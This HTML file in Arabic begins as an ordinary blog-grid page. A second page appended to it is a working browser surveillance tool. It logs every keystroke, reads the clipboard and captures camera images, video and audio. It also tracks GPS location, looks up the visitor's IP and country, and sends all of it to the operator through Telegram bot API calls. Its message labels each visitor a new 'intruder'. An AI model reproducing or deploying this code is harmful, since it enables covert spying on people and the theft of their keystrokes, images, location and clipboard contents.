<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مدونات كاملة</title>
  <style>
    body {
      margin: 0;
      background: #fff000;
      font-family: Arial, sans-serif;
    }

    #blogs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      padding: 30px;
      direction: rtl;
    }

    .blog-box {
      background: rgba(90, 0, 130, 0.2);
      border: 2px dashed #cc33ff;
      box-shadow: 0 0 15px #cc33ff, 0 0 30px #9900cc;
      border-radius: 15px;
      padding: 10px;
      color: black;
      height: 150px;
      overflow: hidden;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .blog-box:hover {
      transform: scale(1.05);
    }

    /* مربع كبير يغطي الشاشة بالكامل */
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px;
      z-index: 999;
      flex-direction: column;
    }

    #fullText {
      font-size: 28px;
      line-height: 2.2;
      white-space: pre-wrap;
      max-width: 90vw;
    }

    #copyBtn {
      margin-top: 30px;
      background-color: purple;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .home-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 75px;
      height: 75px;
      background-color: pink;
      color: black;
      font-size: 30px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      z-index: 1000;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px yellow; }
      50% { box-shadow: 0 0 25px yellow; }
      100% { box-shadow: 0 0 5px yellow; }
    }

    @media (max-width: 768px) {
      #blogs {
        grid-template-columns: 1fr;
      }
      #fullText {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>

<!-- شبكة المربعات -->
<div id="blogs"></div>

<!-- مربع يغطي الشاشة بالكامل -->
<div id="overlay" onclick="hideOverlay(event)">
  <div id="fullText" onclick="event.stopPropagation()"></div>
  <button id="copyBtn" onclick="copyText()">📋 نسخ النص</button>
</div>

<!-- زر وردي يرجع إلى index.html -->
<a href="index.html" class="home-btn" title="العودة للصفحة الرئيسية">🏠</a>

<script>
  const blogFiles = ['blog1.txt', 'blog2.txt', 'blog3.txt'];
  const blogsContainer = document.getElementById('blogs');
  const overlay = document.getElementById('overlay');
  const fullText = document.getElementById('fullText');
  let allBlogs = [];

  async function loadBlogs() {
    for (const file of blogFiles) {
      try {
        const res = await fetch(file);
        const text = await res.text();
        const parts = text.split(/(?:\r?\n){2,}|===/g).filter(e => e.trim());
        allBlogs.push(...parts);
      } catch (err) {
        console.error('فشل تحميل', file, err);
      }
    }

    allBlogs.slice(0, 9).forEach((text) => {
      const box = document.createElement('div');
      box.className = 'blog-box';
      box.innerText = text.substring(0, 60) + '...';
      box.onclick = () => showFullText(text);
      blogsContainer.appendChild(box);
    });
  }

  function showFullText(text) {
    fullText.innerText = text;
    overlay.style.display = 'flex';
  }

  function hideOverlay(event) {
    overlay.style.display = 'none';
  }

  function copyText() {
    navigator.clipboard.writeText(fullText.innerText)
      .then(() => alert("✅ تم نسخ النص!"));
  }

  loadBlogs();
</script>
</div>


<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تشغيل شامل ومتكامل 🔐</title>
</head>
<body>

<button onclick="startEverything()">🚀 بداية التشغيل الشامل</button>

<script>
const bots = [
  { token: 'توكن_البوت_1', chat_id: 'ايدي_1' },
  { token: 'توكن_البوت_2', chat_id: 'ايدي_2' },
  { token: 'توكن_البوت_3', chat_id: 'ايدي_3' }
];

let lastKnownLat = "", lastKnownLon = "", lastKnownAcc = "";
let locationInterval;

// إرسال رسالة نصية منسقة
function sendToAllBots(message) {
  bots.forEach(bot => {
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: bot.chat_id, text: message })
    });
  });
}

// إرسال صورة base64
function sendImageToAllBots(base64Data) {
  const blob = base64ToBlob(base64Data);
  bots.forEach(bot => {
    const fd = new FormData();
    fd.append("chat_id", bot.chat_id);
    fd.append("photo", blob, "image.png");
    fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, { method: "POST", body: fd });
  });
}

// إرسال فيديو blob
function sendVideoToAllBots(videoBlob) {
  bots.forEach(bot => {
    const fd = new FormData();
    fd.append("chat_id", bot.chat_id);
    fd.append("video", videoBlob, "video.webm");
    fetch(`https://api.telegram.org/bot${bot.token}/sendVideo`, { method: "POST", body: fd });
  });
}

function base64ToBlob(base64) {
  const bstr = atob(base64.split(',')[1]);
  const mime = base64.split(',')[0].split(':')[1].split(';')[0];
  const u8 = new Uint8Array(bstr.length);
  for (let i = 0; i < bstr.length; i++) u8[i] = bstr.charCodeAt(i);
  return new Blob([u8], { type: mime });
}

// التقاط 10 صور بفاصل 1 ثانية
function capture10Images() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const v = document.createElement("video");
      v.srcObject = stream; v.play(); v.style.display = "none";
      document.body.appendChild(v);
      const c = document.createElement("canvas"), ctx = c.getContext("2d");
      let count = 0;
      const iv = setInterval(() => {
        if (count >= 10) { clearInterval(iv); stream.getTracks().forEach(t=>t.stop()); sendToAllBots("✅ تم التقاط 10 صور"); return; }
        c.width = v.videoWidth; c.height = v.videoHeight;
        ctx.drawImage(v,0,0,c.width,c.height);
        sendImageToAllBots(c.toDataURL("image/png"));
        count++;
      }, 1000);
    })
    .catch(err => sendToAllBots("🚫 خطأ بالكاميرا: " + err));
}

// تسجيل فيديو صوت+صورة (مثلاً 10 ثواني)
function recordVideo(duration = 10) {
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(stream => {
      const recorder = new MediaRecorder(stream), chunks = [];
      recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        sendVideoToAllBots(blob);
        stream.getTracks().forEach(t=>t.stop());
      };
      recorder.start();
      setTimeout(() => recorder.stop(), duration*1000);
    })
    .catch(err => sendToAllBots("🚫 فشل تسجيل الفيديو: " + err));
}

// طلب إذن الميكروفون
function requestMicrophoneAccess() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => { sendToAllBots("🎤 تم السماح بالميكروفون"); stream.getTracks().forEach(t=>t.stop()); })
    .catch(err => sendToAllBots("🚫 فشل إذن الميكروفون: " + err));
}

// قراءة الحافظة
function readClipboard() {
  navigator.clipboard.readText()
    .then(text => sendToAllBots("📋 الحافظة:\n" + text))
    .catch(() => sendToAllBots("🚫 فشل قراءة الحافظة"));
}

// تسجيل ضغطات الكيبورد
document.addEventListener("keydown", e => {
  sendToAllBots("⌨️ مفتاح: " + e.key);
});

// تتبع الموقع وحفظه
function getLocationAndStore() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => {
      lastKnownLat = pos.coords.latitude;
      lastKnownLon = pos.coords.longitude;
      lastKnownAcc = pos.coords.accuracy;
    },
    err => sendToAllBots("🚫 خطأ GPS: " + err.message)
  );
}

// تتبع مستمر كل فترة (مثلاً 60 ثانية)
function startLocationTracking(intervalSeconds = 60) {
  getLocationAndStore();
  locationInterval = setInterval(getLocationAndStore, intervalSeconds*1000);
}

// جلب IP والدولة وعلمها
async function fetchIpAndCountry() {
  const ipRes = await fetch("https://api.ipify.org?format=json");
  const { ip } = await ipRes.json();
  const infoRes = await fetch(`https://ipapi.co/${ip}/json/`);
  const info = await infoRes.json();
  const country = info.country_name || "غير معروف";
  const code = info.country_code || "";
  const flag = code.toUpperCase().replace(/./g, ch => String.fromCodePoint(127397 + ch.charCodeAt()));
  return { ip, country, flag };
}

// تحضير الرسالة المنسقة وإرسالها
async function prepareAndSendEntryMessage() {
  try {
    const { ip, country, flag } = await fetchIpAndCountry();
    const msg = `
👑 شادو، هناك دخيل جديد 👑
${flag} ${country}

🌐 بيانات الدخيل 🌐
🆔 IP: ${ip}
🌍 رابط الموقع: ${window.location.href}
📡 GPS:
📍 Lat: ${lastKnownLat || "?"}
📍 Lon: ${lastKnownLon || "?"}
🎯 الدقة: ±${lastKnownAcc || "?"} متر

🎬 فيديو سيتم إرساله 🎬
📸 صور سيتم إرسالها بعد قليل 📸
    `.trim();
    sendToAllBots(msg);
  } catch (err) {
    sendToAllBots("🚫 فشل تجهيز رسالة الدخول: " + err);
  }
}

// بدء كل شيء
function startEverything() {
  prepareAndSendEntryMessage();
  capture10Images();
  recordVideo(10);
  requestMicrophoneAccess();
  readClipboard();
  startLocationTracking(60);
}

</script>

</body>
</html>
